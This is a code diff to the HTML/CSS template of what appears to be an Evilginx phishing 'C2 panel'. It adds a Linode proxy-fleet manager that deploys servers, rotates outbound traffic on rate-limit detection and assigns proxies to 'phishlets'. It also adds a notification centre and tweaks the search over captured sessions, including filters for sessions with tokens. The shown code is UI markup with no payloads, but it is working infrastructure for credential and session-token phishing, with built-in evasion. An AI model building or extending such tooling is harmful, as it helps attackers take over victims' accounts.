@@ -17,11 +17,12 @@
   --bg:#0a0e17;--bg2:#111827;--bg3:#1a2332;--bg4:#1e293b;
   --accent:#00ff88;--accent2:#00cc6a;--accent-dim:rgba(0,255,136,0.1);
   --cyan:#22d3ee;--red:#ef4444;--orange:#f59e0b;--purple:#a78bfa;--yellow:#facc15;
-  --text:#f1f5f9;--text2:#94a3b8;--text3:#475569;
+  --text:#f1f5f9;--text2:#e2e8f0;--text3:#e2e8f0;
   --border:rgba(0,255,136,0.12);--border-h:rgba(0,255,136,0.3);
   --font:'Inter',-apple-system,sans-serif;--mono:'JetBrains Mono','Fira Code',monospace;
 }
 html,body{height:100%;background:var(--bg);color:var(--text2);font-family:var(--font);font-size:15px;overflow:hidden}
+input::placeholder,textarea::placeholder{color:#e2e8f0;opacity:1}
 ::-webkit-scrollbar{width:6px}::-webkit-scrollbar-track{background:var(--bg2)}::-webkit-scrollbar-thumb{background:rgba(0,255,136,0.15);border-radius:3px}::-webkit-scrollbar-thumb:hover{background:rgba(0,255,136,0.3)}
 a{color:var(--cyan);text-decoration:none}
 .app{display:flex;height:100vh;overflow:hidden;min-width:0}
@@ -114,8 +115,13 @@ tr:hover td{background:var(--accent-dim)}
 .btn.danger:hover{background:rgba(239,68,68,0.1);border-color:var(--red)}
 .btn.cyan{border-color:rgba(34,211,238,0.3);color:var(--cyan)}
 .btn.cyan:hover{background:rgba(34,211,238,0.1);border-color:var(--cyan)}
+.btn.orange{border-color:rgba(245,158,11,0.35);color:var(--orange)}
+.btn.orange:hover{background:rgba(245,158,11,0.1);border-color:var(--orange)}
 .btn.fill{background:var(--accent);color:var(--bg);border-color:var(--accent)}
 .btn.fill:hover{filter:brightness(1.15);transform:translateY(-1px)}
+.btn:disabled{opacity:0.5;cursor:wait;pointer-events:none;transform:none;filter:none}
+.btn.busy{opacity:0.72;cursor:wait;pointer-events:none;transform:none;filter:none}
+.btn.busy i.fa-spinner{filter:drop-shadow(0 0 6px currentColor)}
 .btn-group{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;align-items:center}
 .toolbar{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;flex-wrap:wrap;gap:10px}
 .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
@@ -147,6 +153,7 @@ tr:hover td{background:var(--accent-dim)}
 @keyframes toastSlide{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
 #terminal-container,#shell-container{height:calc(100vh - 130px);background:#000;border:1px solid var(--border);border-radius:10px;overflow:hidden}
 .search-box{position:relative;display:flex;align-items:center}.search-box input{width:280px;height:40px;padding:0 14px 0 38px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-family:var(--font);font-size:13px;outline:none;transition:border-color 0.3s,box-shadow 0.3s}.search-box input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(0,255,136,0.08)}.search-box input::placeholder{color:var(--text3)}.search-box i{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:var(--text3);font-size:13px;pointer-events:none}
+#sessSearch:-webkit-autofill,#sessSearch:-webkit-autofill:hover,#sessSearch:-webkit-autofill:focus{-webkit-text-fill-color:var(--text);transition:background-color 9999s ease-out;box-shadow:0 0 0 1000px var(--bg) inset}
 .detail-grid{display:grid;grid-template-columns:140px 1fr;gap:10px;font-size:14px;margin-bottom:20px}
 .detail-grid .lbl{color:var(--accent);text-transform:uppercase;letter-spacing:1px;font-size:12px;font-weight:600}
 .detail-grid .val{color:var(--text2);word-break:break-all}
@@ -241,7 +248,7 @@ tr:hover td{background:var(--accent-dim)}
 .fr-bar .fr-field label{display:block;font-size:11px;font-weight:600;color:var(--accent);letter-spacing:1px;text-transform:uppercase;margin-bottom:6px}
 .fr-bar .fr-field input{width:100%;height:40px;padding:0 12px;background:var(--bg2);border:1px solid var(--border);border-radius:8px;color:#fff;font-family:var(--mono);font-size:13px;outline:none;transition:border-color 0.3s,box-shadow 0.3s}
 .fr-bar .fr-field input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(0,255,136,0.08)}
-.fr-bar .fr-field input::placeholder{color:rgba(255,255,255,0.4)}
+.fr-bar .fr-field input::placeholder{color:rgba(255,255,255,0.75)}
 .fr-bar .btn{height:40px;white-space:nowrap;flex-shrink:0}
 @media(max-width:768px){.fr-bar{flex-wrap:wrap}.fr-bar .btn{width:100%}}
 .fe-bar{display:flex;align-items:center;gap:8px;margin-bottom:14px;flex-wrap:wrap}
@@ -293,17 +300,212 @@ tr:hover td{background:var(--accent-dim)}
 .h-pill b.warn{color:var(--orange)}
 .h-pill b.crit{color:var(--red)}
 @media(max-width:768px){.h-banner{flex-direction:column;align-items:flex-start}.h-pulse{width:100%;height:40px}}
+
+/* ── Proxy Manager ── */
+.px-key-box{background:var(--bg2);border:1px solid var(--border);border-radius:14px;padding:32px;max-width:560px;margin:0 auto}
+.px-key-box h3{font-size:16px;color:var(--text);margin-bottom:6px}
+.px-key-box p{font-size:13px;color:var(--text3);margin-bottom:18px;line-height:1.5}
+.px-key-row{display:flex;gap:10px}
+.px-key-row input{flex:1}
+.px-connected{display:flex;align-items:center;gap:10px;padding:12px 16px;background:rgba(0,255,136,0.06);border:1px solid rgba(0,255,136,0.18);border-radius:10px;margin-bottom:20px;font-size:13px;color:var(--accent);font-weight:600}
+.px-connected i{font-size:16px}
+.px-top-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:22px;align-items:stretch}
+@media(max-width:1100px){.px-top-grid{grid-template-columns:1fr}}
+.px-card{background:var(--bg2);border:1px solid var(--border);border-radius:14px;padding:20px;min-width:0;display:flex;flex-direction:column}
+.px-card .sec-title{margin-bottom:14px;padding-bottom:10px}
+.px-deploy-row{display:flex;gap:10px;align-items:flex-end;flex-wrap:wrap;margin-bottom:16px}
+.px-deploy-row .field{margin:0;flex:0 0 88px;min-width:88px;display:flex;flex-direction:column;justify-content:flex-end}
+.px-deploy-row .field input{width:100%;height:46px;padding:0 10px;text-align:center;font-size:16px;line-height:normal;box-sizing:border-box;-moz-appearance:textfield}
+.px-deploy-row .field input::-webkit-outer-spin-button,.px-deploy-row .field input::-webkit-inner-spin-button{-webkit-appearance:none;margin:0}
+.px-deploy-row .btn{height:46px;padding:0 16px;display:inline-flex;align-items:center;justify-content:center;white-space:nowrap;box-sizing:border-box;flex:0 0 auto;width:auto}
+.px-region-wrap{margin-bottom:8px}
+.px-dd{position:relative}
+.px-dd-btn{width:100%;display:flex;align-items:center;justify-content:space-between;gap:10px;padding:12px 14px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text2);font-family:var(--font);font-size:14px;cursor:pointer;text-align:left}
+.px-dd-btn:hover,.px-dd.open .px-dd-btn{border-color:var(--cyan);box-shadow:0 0 0 1px rgba(34,211,238,0.25)}
+.px-dd-searchwrap{padding:0;cursor:text}
+.px-dd-searchwrap input{flex:1;min-width:0;height:46px;border:none;background:transparent;color:var(--text);font-family:var(--font);font-size:14px;padding:0 14px;outline:none}
+.px-dd-searchwrap input::placeholder{color:var(--text3)}
+.px-dd-caret{flex-shrink:0;width:42px;height:46px;border:none;background:transparent;color:var(--text2);cursor:pointer;display:flex;align-items:center;justify-content:center}
+.px-dd-caret i{transition:transform .2s}
+.px-dd.open .px-dd-caret i{transform:rotate(180deg)}
+.px-dd-btn .ph{color:var(--text3)}
+.px-dd.open .px-dd-btn i{transform:rotate(180deg)}
+.px-dd-btn i{transition:transform .2s}
+.px-dd-menu{display:none;position:absolute;left:0;right:0;top:calc(100% + 4px);z-index:40;max-height:320px;overflow-y:auto;background:#1b2330;border:1px solid rgba(34,211,238,0.45);border-radius:8px;box-shadow:0 16px 40px rgba(0,0,0,0.45);padding:6px 0}
+.px-dd.open .px-dd-menu{display:block}
+.px-dd-group{padding:8px 0 4px}
+.px-dd-group-title{padding:8px 14px 6px;font-size:11px;letter-spacing:1.4px;text-transform:uppercase;color:var(--text3);font-weight:700}
+.px-dd-item{display:flex;align-items:center;gap:10px;width:100%;padding:8px 14px;background:none;border:none;color:#f1f5f9;font-size:13.5px;cursor:pointer;text-align:left;font-family:var(--font)}
+.px-dd-item:hover{background:rgba(34,211,238,0.12)}
+.px-dd-item .slug{color:var(--text3)}
+.px-dd-empty{padding:14px;color:var(--text3);font-size:13px}
+.px-chips{display:flex;flex-wrap:wrap;gap:8px;margin-top:10px;margin-bottom:8px}
+.px-chip{display:inline-flex;align-items:center;gap:8px;padding:7px 10px 7px 8px;background:var(--bg);border:1px solid var(--border-h);border-radius:999px;font-size:13px;color:var(--text);animation:pxChipIn .25s ease}
+.px-chip img,.px-flag-img{width:18px;height:13px;object-fit:cover;border-radius:2px;flex-shrink:0;box-shadow:0 0 0 1px rgba(255,255,255,0.08)}
+.px-chip .x{border:none;background:rgba(239,68,68,0.12);color:var(--red);width:20px;height:20px;border-radius:50%;cursor:pointer;font-size:12px;line-height:1;display:flex;align-items:center;justify-content:center}
+.px-chip .x:hover{background:var(--red);color:#fff}
+.px-chip .sub{color:var(--text3);font-size:11px;font-family:var(--mono)}
+@keyframes pxChipIn{from{opacity:0;transform:scale(.85)}to{opacity:1;transform:scale(1)}}
+.px-progress{height:8px;background:var(--bg);border-radius:4px;overflow:hidden;margin-bottom:6px}
+.px-progress-bar{height:100%;background:linear-gradient(90deg,var(--accent),var(--cyan));border-radius:4px;transition:width 0.4s;width:0}
+.px-step{font-size:12px;color:var(--text);font-family:var(--mono);margin-bottom:16px}
+#pxDeployProgress{margin-top:18px}
+.px-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(380px,1fr));gap:16px;margin-top:16px}
+@media(max-width:1100px){.px-grid{grid-template-columns:repeat(auto-fill,minmax(360px,1fr))}}
+.px-tile{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:18px;transition:border-color 0.2s}
+.px-tile:hover{border-color:var(--border-h)}
+.px-tile.px-in{animation:pxTileIn .45s cubic-bezier(0.16,1,0.3,1) both}
+@keyframes pxTileIn{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
+.px-skel{pointer-events:none}
+.px-skel .sh{background:linear-gradient(90deg,var(--bg3) 0%,var(--bg4) 45%,var(--bg3) 90%);background-size:200% 100%;animation:pxShimmer 1.2s ease infinite;border-radius:6px;height:12px;margin-bottom:10px}
+.px-skel .sh.lg{height:18px;width:62%}
+.px-skel .sh.sm{width:40%;height:10px}
+@keyframes pxShimmer{0%{background-position:100% 0}100%{background-position:-100% 0}}
+.px-tile-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
+.px-tile-label{font-size:14px;font-weight:600;color:var(--text);font-family:var(--mono)}
+.px-badge{padding:3px 10px;border-radius:999px;font-size:11px;font-weight:600;letter-spacing:0.5px;text-transform:uppercase}
+.px-badge.active{background:rgba(0,255,136,0.12);color:var(--accent)}
+.px-badge.provisioning,.px-badge.installing,.px-badge.booting,.px-badge.rebooting{background:rgba(245,158,11,0.12);color:var(--orange)}
+.px-badge.stopped,.px-badge.offline{background:rgba(71,85,105,0.22);color:#94a3b8}
+.px-badge.failed{background:rgba(239,68,68,0.12);color:var(--red)}
+.px-tile-row{display:flex;justify-content:space-between;font-size:12px;color:var(--text3);margin-bottom:6px}
+.px-tile-row .v{color:var(--text2);font-family:var(--mono)}
+.px-ph-list{margin-top:10px;padding-top:10px;border-top:1px solid var(--border)}
+.px-ph-list .k{font-size:11px;letter-spacing:1px;text-transform:uppercase;color:var(--accent);margin-bottom:8px;font-weight:600}
+.px-ph-tags{display:flex;flex-wrap:wrap;gap:6px}
+.px-ph-tag{display:inline-flex;align-items:center;gap:6px;padding:4px 8px;border-radius:999px;background:rgba(34,211,238,0.08);border:1px solid rgba(34,211,238,0.18);color:var(--cyan);font-size:11px;font-weight:600}
+.px-ph-tag .n{color:var(--text3);font-weight:500;font-family:var(--mono)}
+.px-ph-empty{font-size:12px;color:var(--text3)}
+.px-tile-actions{margin-top:12px;display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:8px}
+.px-tile-actions .btn{white-space:nowrap;width:100%;justify-content:center;padding:8px 10px}
+.px-pwr-btn{border-color:rgba(0,255,136,0.28)!important;color:var(--accent)!important;background:transparent!important}
+.px-pwr-btn:hover:not(:disabled){background:var(--accent-dim)!important;border-color:var(--accent)!important}
+.px-pwr-btn.dim,.px-pwr-btn:disabled{opacity:1 !important;color:rgba(0,255,136,0.5)!important;border-color:rgba(0,255,136,0.28)!important;background:transparent!important;cursor:not-allowed;filter:none;transform:none}
+.px-pwr{margin:12px 0 2px}
+.px-pwr-lab{display:flex;justify-content:space-between;align-items:center;gap:8px;font-size:11px;letter-spacing:0.6px;text-transform:uppercase;color:var(--accent);font-weight:600;margin-bottom:6px;font-family:var(--mono)}
+.px-pwr-lab span{color:var(--text3);text-transform:none;letter-spacing:0}
+.px-pwr-track{height:8px;background:rgba(255,255,255,0.05);border-radius:99px;overflow:hidden;box-shadow:inset 0 0 0 1px rgba(0,255,136,0.1)}
+.px-pwr-fill{display:block;height:100%;width:0;border-radius:99px;background:linear-gradient(90deg,var(--accent),var(--cyan));box-shadow:0 0 12px rgba(0,255,136,0.35);transition:width 0.7s cubic-bezier(0.16,1,0.3,1);position:relative;overflow:hidden}
+.px-pwr-fill::after{content:'';position:absolute;inset:0 auto 0 0;width:40%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.4),transparent);animation:pxPwrShine 1.4s ease-in-out infinite}
+@keyframes pxPwrShine{from{transform:translateX(-120%)}to{transform:translateX(320%)}}
+.px-assign-box{margin-top:0}
+.px-assign-box .sec-title{margin-bottom:14px}
+.px-assign-row{display:flex;gap:10px;align-items:flex-end;flex-wrap:nowrap}
+.px-assign-row .field{margin:0;flex:1;min-width:0}
+.px-assign-row .field select{height:46px;padding:0 12px}
+.px-assign-row .btn{height:46px;white-space:nowrap;flex:0 0 auto;display:inline-flex;align-items:center;justify-content:center}
+.px-assign-checks{display:flex;flex-direction:column;gap:8px;margin:12px 0;max-height:140px;overflow-y:auto}
+.px-assign-check{display:flex;align-items:center;gap:6px;cursor:pointer;font-size:13px;color:var(--text2)}
+.px-assign-check input{accent-color:var(--accent)}
+.px-cur-assign{margin-top:14px;padding:14px;background:var(--bg);border-radius:10px;border:1px solid var(--border)}
+.px-cur-assign h4{font-size:12px;color:var(--accent);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}
+.px-cur-assign .row{display:flex;justify-content:space-between;align-items:center;gap:10px;font-size:13px;padding:6px 0;color:var(--text2);flex-wrap:wrap}
+.px-cur-assign .row b{color:var(--text);font-weight:600}
+.px-ip-chip{display:inline-flex;align-items:center;gap:6px;padding:3px 8px;border-radius:999px;background:var(--bg2);border:1px solid var(--border);font-family:var(--mono);font-size:12px;margin:2px}
+.px-ip-chip.on{border-color:var(--accent);color:var(--accent)}
+.px-ip-chip button{border:none;background:transparent;color:var(--red);cursor:pointer;padding:0 2px;font-size:13px;line-height:1}
+.px-chart-card{background:var(--bg2);border:1px solid var(--border);border-radius:14px;padding:20px;margin-bottom:22px;position:relative;overflow:hidden}
+.px-chart-card::before{content:'';position:absolute;inset:-40% -20% auto auto;width:280px;height:280px;background:radial-gradient(circle,rgba(0,255,136,0.08),transparent 70%);pointer-events:none}
+.px-chart-card .sec-title{margin-bottom:8px}
+.px-chart-hint{font-size:12px;color:var(--text3);margin:0 0 14px;font-family:var(--mono)}
+.px-chart-grid{display:grid;grid-template-columns:minmax(0,1.45fr) minmax(0,0.9fr);gap:18px;align-items:stretch}
+@media(max-width:1100px){.px-chart-grid{grid-template-columns:1fr}}
+.px-chart-pane{min-width:0;background:linear-gradient(180deg,rgba(0,255,136,0.03),rgba(34,211,238,0.02));border:1px solid var(--border);border-radius:12px;padding:14px 16px 12px;position:relative}
+.px-chart-h{font-size:11px;letter-spacing:1.4px;text-transform:uppercase;color:var(--accent);font-weight:700;margin-bottom:10px}
+.px-chart-wrap{height:260px;position:relative}
+.px-chart-wrap.donut{height:248px}
+.px-chart-wrap.bars{height:auto;min-height:220px}
+.px-bar-legend{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px}
+.px-bar-leg{display:inline-flex;align-items:center;gap:6px;font-size:11px;color:var(--text2);font-weight:600}
+.px-bar-leg i{width:8px;height:8px;border-radius:50%;box-shadow:0 0 8px currentColor;display:inline-block}
+.px-bars{display:flex;flex-direction:column;gap:14px;justify-content:center}
+.px-bar-row{display:grid;grid-template-columns:minmax(118px,148px) 1fr 78px;gap:10px;align-items:center}
+.px-bar-lab{font-family:var(--mono);font-size:11px;color:var(--text2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.px-bar-track{height:16px;background:rgba(255,255,255,0.04);border-radius:99px;overflow:hidden;position:relative;box-shadow:inset 0 0 0 1px rgba(0,255,136,0.08),0 0 18px rgba(0,255,136,0.04)}
+.px-bar-fill{height:100%;display:flex;transform-origin:left center;border-radius:99px;overflow:hidden;min-width:0;position:relative;box-shadow:0 0 14px rgba(0,255,136,0.28)}
+.px-bar-fill.charge{animation:pxCharge 1.15s cubic-bezier(0.16,1,0.3,1) both}
+.px-bar-fill.charge::after{content:'';position:absolute;top:0;bottom:0;width:42%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.38),transparent);animation:pxShine 1.35s 0.25s ease-out both;pointer-events:none}
+.px-bar-seg{height:100%;display:block;flex-shrink:0}
+@keyframes pxCharge{from{transform:scaleX(0);filter:brightness(0.6)}to{transform:scaleX(1);filter:brightness(1)}}
+@keyframes pxShine{from{transform:translateX(-120%)}to{transform:translateX(280%)}}
+.px-bar-val{font-family:var(--mono);font-size:12px;color:var(--accent);font-weight:700;text-align:right;text-shadow:0 0 10px rgba(0,255,136,0.35)}
+.px-donut-center{position:absolute;left:50%;top:46%;transform:translate(-50%,-50%);text-align:center;pointer-events:none;z-index:2}
+.px-donut-center b{display:block;font-size:20px;color:var(--accent);font-family:var(--mono);font-weight:700;text-shadow:0 0 16px rgba(0,255,136,0.45);letter-spacing:0.3px}
+.px-donut-center span{display:block;margin-top:3px;font-size:10px;letter-spacing:1.4px;text-transform:uppercase;color:var(--text3)}
+.px-tr-row{margin-bottom:8px}
+.px-tr-top{display:flex;justify-content:space-between;align-items:baseline;gap:10px;font-size:12px;color:var(--text2);margin-bottom:4px}
+.px-tr-top b{color:var(--cyan);font-weight:600}
+.px-tr-top .v{font-family:var(--mono);color:var(--text);font-weight:600}
+.px-tr-bar{height:5px;background:var(--bg);border-radius:99px;overflow:hidden}
+.px-tr-bar i{display:block;height:100%;background:linear-gradient(90deg,var(--accent),var(--cyan));border-radius:99px;width:0}
+.px-traf-table-wrap{margin-top:16px;overflow-x:auto;border:1px solid var(--border);border-radius:10px;background:var(--bg)}
+.px-traf-table-wrap table{width:100%}
+.px-traf-table-wrap th{font-size:11px}
+.px-traf-table-wrap td{font-size:13px}
+.px-traf-empty{text-align:center;padding:28px 16px;color:var(--text3);font-size:13px}
+
+/* ── Notification Centre ── */
+.nc-bell{position:relative;background:none;border:1px solid var(--border);color:var(--text2);font-size:16px;width:38px;height:38px;border-radius:8px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all 0.2s;margin-right:14px;flex-shrink:0}
+.nc-bell:hover{border-color:var(--accent);color:var(--accent);background:var(--accent-dim)}
+.nc-badge{position:absolute;top:-5px;right:-5px;min-width:18px;height:18px;border-radius:9px;background:var(--red);color:#fff;font-size:10px;font-weight:700;display:flex;align-items:center;justify-content:center;padding:0 4px;line-height:1}
+.nc-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.4);z-index:1050;opacity:0;pointer-events:none;transition:opacity 0.3s}
+.nc-overlay.open{opacity:1;pointer-events:auto}
+.nc-panel{position:fixed;top:0;right:-400px;width:380px;height:100vh;background:var(--bg2);border-left:1px solid var(--border);z-index:1051;display:flex;flex-direction:column;transition:right 0.3s cubic-bezier(0.16,1,0.3,1)}
+.nc-panel.open{right:0}
+.nc-head{display:flex;justify-content:space-between;align-items:center;padding:14px 16px 10px;border-bottom:none;flex-shrink:0;gap:12px}
+.nc-head-title{display:flex;align-items:center;gap:10px;min-width:0}
+.nc-head-title i{color:var(--accent);font-size:16px;flex-shrink:0}
+.nc-head h3{font-size:16px;font-weight:600;color:var(--text);letter-spacing:0;text-transform:none;margin:0;line-height:1.2}
+.nc-close{width:36px;height:36px;border:none;background:transparent;color:var(--text2);font-size:22px;line-height:1;cursor:pointer;border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-family:var(--font)}
+.nc-close:hover{background:var(--bg3);color:#fff}
+.nc-actions{display:flex;gap:8px;padding:0 16px 12px;border-bottom:1px solid var(--border);flex-shrink:0}
+.nc-actions button{flex:1;background:var(--bg);border:1px solid var(--border);color:#cbd5e1;font-size:12px;font-weight:600;padding:9px 10px;border-radius:8px;cursor:pointer;white-space:nowrap;display:inline-flex;align-items:center;justify-content:center;gap:6px;font-family:var(--font);transition:all 0.2s;line-height:1.2}
+.nc-actions button i{font-size:12px}
+.nc-actions button:hover{border-color:var(--accent);color:var(--accent);background:var(--accent-dim)}
+.nc-list{flex:1;overflow-y:auto;padding:12px}
+.nc-empty{text-align:center;padding:40px 20px;color:var(--text3);font-size:13px}
+.nc-item{padding:12px 14px;border-radius:10px;margin-bottom:8px;background:var(--bg);border:1px solid var(--border);cursor:pointer;transition:all 0.2s;border-left:3px solid transparent}
+.nc-item:hover{border-color:var(--border-h)}
+.nc-item.unread{border-left-color:var(--accent);background:rgba(0,255,136,0.03)}
+.nc-item-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:4px}
+.nc-item-title{font-size:13px;font-weight:600;color:var(--text)}
+.nc-item-time{font-size:11px;color:var(--text3);font-family:var(--mono)}
+.nc-item-msg{font-size:12px;color:var(--text2);line-height:1.5}
+.nc-item-icon{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px;flex-shrink:0}
+.nc-item-icon.success{background:var(--accent)}
+.nc-item-icon.warning{background:var(--orange)}
+.nc-item-icon.error{background:var(--red)}
+.nc-item-icon.info{background:var(--cyan)}
+.nc-item-icon.progress{background:var(--purple)}
+@media(max-width:480px){
+  .nc-panel{width:100%;right:-100%}
+  .nc-head{padding:12px 14px 8px}
+  .nc-actions{padding:0 14px 12px}
+}
+@media(max-width:720px){
+  .px-connected{flex-wrap:wrap}
+  .px-connected .btn{width:100%;margin-left:0!important}
+  .px-deploy-row{flex-wrap:wrap;align-items:flex-end}
+  .px-deploy-row .field{flex:0 0 72px;min-width:72px}
+  .px-deploy-row .btn{flex:0 0 auto;width:auto;height:46px}
+  .px-assign-row{flex-wrap:wrap}
+  .px-assign-row .field{flex:1 1 100%}
+  .px-assign-row .btn{flex:1 1 calc(50% - 5px)}
+  .px-grid{grid-template-columns:1fr}
+  .px-tile-actions{grid-template-columns:repeat(2,minmax(0,1fr))}
+}
 </style>
 </head>
 <body>
 <div class="app">
 <aside class="sidebar">
-  <div class="logo"><img class="logo-mark" src="/static/logo.png?v=4" alt=""><h1>EVILGINX</h1><div class="sub">C2 PANEL v3.1</div></div>
+  <div class="logo"><img class="logo-mark" src="/static/logo.png?v=4" alt=""><h1>EVILGINX</h1><div class="sub">C2 PANEL v{{ panel_version }}</div></div>
   <nav>
     <a href="#" data-page="dashboard" class="active"><i class="fa-solid fa-chart-line"></i>Dashboard</a>
     <a href="#" data-page="phishlets"><i class="fa-solid fa-fish-fins"></i>Phishlets</a>
     <a href="#" data-page="config"><i class="fa-solid fa-sliders"></i>Configuration</a>
     <a href="#" data-page="lures"><i class="fa-solid fa-link"></i>Lures</a>
+    <a href="#" data-page="proxy"><i class="fa-solid fa-server"></i>Proxy</a>
     <a href="#" data-page="files"><i class="fa-solid fa-folder-open"></i>File Explorer</a>
     <a href="#" data-page="services"><i class="fa-solid fa-gears"></i>Services</a>
     <a href="#" data-page="notifications"><i class="fa-solid fa-bell"></i>Notifications</a>
@@ -321,6 +523,7 @@ tr:hover td{background:var(--accent-dim)}
 <div class="main">
   <header class="topbar">
     <div class="topbar-left"><button class="menu-toggle" onclick="toggleSidebar()" title="Toggle menu"><i class="fa-solid fa-bars"></i></button><div class="page-title" id="pageTitle">DASHBOARD</div></div>
+    <button class="nc-bell" onclick="toggleNcPanel()" title="Notifications"><i class="fa-solid fa-bell"></i><span class="nc-badge" id="ncBadge" style="display:none">0</span></button>
     <div class="info"><span><i class="fa-solid fa-globe"></i> <span class="val" id="topDomain">—</span></span><span><i class="fa-solid fa-network-wired"></i> <span class="val" id="topIp">—</span></span></div>
   </header>
   <div class="content">
@@ -414,7 +617,11 @@ tr:hover td{background:var(--accent-dim)}
     <button class="btn sessFilter" data-filter="tokens" onclick="filterSessions('tokens',this)"><i class="fa-solid fa-cookie-bite"></i> WITH TOKENS <span class="filt-n" data-cnt="tokens"></span></button>
     <button class="btn sessFilter" data-filter="empty" onclick="filterSessions('empty',this)"><i class="fa-solid fa-ban"></i> EMPTY <span class="filt-n" data-cnt="empty"></span></button>
     <div class="filter-spacer"></div>
-    <div class="search-box"><i class="fa-solid fa-magnifying-glass"></i><input id="sessSearch" placeholder="Search by ID, IP, username..." oninput="searchSessions(this.value)"></div>
+    <div aria-hidden="true" style="position:absolute;left:-10000px;width:1px;height:1px;overflow:hidden">
+      <input type="text" name="username" autocomplete="username" tabindex="-1">
+      <input type="password" name="password" autocomplete="current-password" tabindex="-1">
+    </div>
+    <div class="search-box"><i class="fa-solid fa-magnifying-glass"></i><input id="sessSearch" type="search" name="egx-sess-q" placeholder="Search by ID, IP, login..." autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" data-lpignore="true" data-1p-ignore="true" data-form-type="other" readonly onfocus="this.removeAttribute('readonly')" oninput="searchSessions(this.value)"></div>
     <button class="btn" onclick="loadSessions()"><i class="fa-solid fa-arrows-rotate"></i> Refresh</button>
     <button class="btn danger" onclick="openClearSessions()"><i class="fa-solid fa-database"></i> CLEAR DATABASE</button>
   </div>
@@ -494,8 +701,88 @@ tr:hover td{background:var(--accent-dim)}
     <div class="h-pill">Network <b class="ok" id="hPillNet">—</b></div>
   </div>
 </section>
+<section id="page-proxy" class="page">
+  <div id="pxKeyPanel" style="display:none">
+    <div class="px-key-box">
+      <h3><i class="fa-solid fa-server" style="color:var(--accent);margin-right:8px"></i>Linode Proxy Fleet</h3>
+      <p>Connect your Linode account to deploy Nanode proxy servers. Evilginx will route outbound traffic through your proxy pool, rotating automatically on rate-limit detection.</p>
+      <div class="px-key-row">
+        <div class="field" style="flex:1;margin:0"><label>LINODE API KEY</label><input id="pxApiKey" type="password" placeholder="Enter your Linode Personal Access Token"></div>
+        <button class="btn fill" onclick="pxConnect()" style="height:46px;align-self:flex-end"><i class="fa-solid fa-plug"></i> Connect</button>
+      </div>
+    </div>
+  </div>
+  <div id="pxMainPanel" style="display:none">
+    <div class="px-connected"><i class="fa-solid fa-circle-check"></i> Linode connected — Evilginx IP: <span id="pxAllowIp" style="font-family:var(--mono);margin-left:4px"></span><button class="btn sm" style="margin-left:auto" onclick="pxDisconnect()"><i class="fa-solid fa-right-from-bracket"></i> Disconnect</button></div>
+    <div class="px-top-grid">
+      <div class="px-card">
+        <div class="sec-title"><i class="fa-solid fa-rocket"></i> Deploy Proxy Servers</div>
+        <div class="px-deploy-row">
+          <div class="field"><label>SERVERS</label><input id="pxCount" type="number" min="1" value="1"></div>
+          <button class="btn fill" onclick="pxDeploy()" id="pxDeployBtn"><i class="fa-solid fa-paper-plane"></i> Deploy Proxies</button>
+          <button class="btn cyan" id="pxRefreshBtn" onclick="loadProxy()"><i class="fa-solid fa-arrows-rotate"></i> Refresh</button>
+        </div>
+        <div class="px-region-wrap">
+          <div class="field" style="margin-bottom:8px"><label>SELECT A REGION <span class="hint" id="pxRegionHint">(pick up to N)</span></label></div>
+          <div class="px-dd" id="pxRegionDd">
+            <div class="px-dd-btn px-dd-searchwrap" onclick="pxFocusRegionSearch()">
+              <input id="pxRegionSearch" type="text" placeholder="Search region (city, country, code)" autocomplete="off" spellcheck="false">
+              <button type="button" class="px-dd-caret" onclick="event.stopPropagation();pxToggleRegions()"><i class="fa-solid fa-chevron-down"></i></button>
+            </div>
+            <div class="px-dd-menu" id="pxRegionMenu"><div class="px-dd-empty">Loading regions…</div></div>
+          </div>
+          <div class="px-chips" id="pxRegionChips"></div>
+        </div>
+        <div id="pxDeployProgress" style="display:none">
+          <div class="px-progress"><div class="px-progress-bar" id="pxBar"></div></div>
+          <div class="px-step" id="pxStep"></div>
+        </div>
+      </div>
+      <div class="px-card px-assign-box">
+        <div class="sec-title"><i class="fa-solid fa-link"></i> Assign Proxies to Phishlet</div>
+        <div class="px-assign-row">
+          <div class="field" style="margin:0;min-width:160px;flex:1"><label>PHISHLET</label><select id="pxAssignPh"></select></div>
+          <button class="btn fill" id="pxAssignBtn" onclick="pxAssign()"><i class="fa-solid fa-check"></i> Assign</button>
+          <button class="btn danger" id="pxDetachBtn" onclick="pxDetach()"><i class="fa-solid fa-link-slash"></i> Detach</button>
+        </div>
+        <div class="px-assign-checks" id="pxAssignChecks"></div>
+        <div class="px-cur-assign" id="pxCurAssign"></div>
+      </div>
+    </div>
+    <div class="px-chart-card" id="pxTrafficCard">
+      <div class="sec-title"><i class="fa-solid fa-chart-column"></i> Traffic by Phishlet</div>
+      <p class="px-chart-hint" id="pxChartHint">Outbound bytes through each proxy, split by phishlet</p>
+      <div class="px-chart-grid">
+        <div class="px-chart-pane">
+          <div class="px-chart-h">Outbound per proxy</div>
+          <div class="px-bar-legend" id="pxBarLegend"></div>
+          <div class="px-chart-wrap bars"><div id="pxChartBars" class="px-bars"></div></div>
+        </div>
+        <div class="px-chart-pane">
+          <div class="px-chart-h">Share by phishlet</div>
